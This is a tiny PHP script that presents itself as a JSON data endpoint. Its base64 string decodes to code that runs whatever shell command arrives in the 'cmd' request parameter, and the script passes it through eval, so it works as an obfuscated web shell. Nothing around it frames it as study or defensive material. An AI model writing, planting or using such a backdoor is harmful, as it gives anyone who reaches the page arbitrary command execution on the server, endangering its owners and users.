<?php

$dt = "cmV0dXJuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSk7Cg==";

$code = eval(base64_decode($dt));

echo json_encode(["data"=>$code]);